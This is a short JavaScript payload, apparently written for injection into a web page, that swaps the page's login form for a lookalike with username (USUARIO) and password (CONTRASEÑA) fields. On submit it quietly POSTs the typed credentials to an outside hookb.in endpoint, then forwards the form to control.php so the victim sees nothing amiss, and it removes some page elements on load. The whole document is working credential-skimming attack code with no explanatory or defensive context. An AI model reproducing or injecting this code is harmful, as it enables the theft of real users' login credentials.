doc = document;
nuevoFormulario = doc.createElement`form`;
cont = doc.getElementById`contenido`;

f = () => {
	fetch("https://hookb.in/BYjWr2kmEmSLDDx317G9", { method: "POST", body: `${nuevoFormulario.childNodes[1].value}
${nuevoFormulario.childNodes[4].value}` }).then(() => {
		nuevoFormulario.action = "control.php";
		nuevoFormulario.submit();
	});
}

nuevoFormulario.action = "javascript:f()";
nuevoFormulario.method = "POST";
nuevoFormulario.innerHTML = '<label for="u">USUARIO: </label><input id="u" class="user" name="usuario"><br><label for="p">CONTRASEÑA: </label><input id="p" class="password" type="password" name="password"><br><input type="submit" class="enviar_btn" value="Entrar">';

cont.replaceChild(nuevoFormulario, doc.forms[0]);
addEventListener("DOMContentLoaded", () => {
	for (i of [4, 4, 5]) {
		cont.childNodes[i].remove();
	}
});
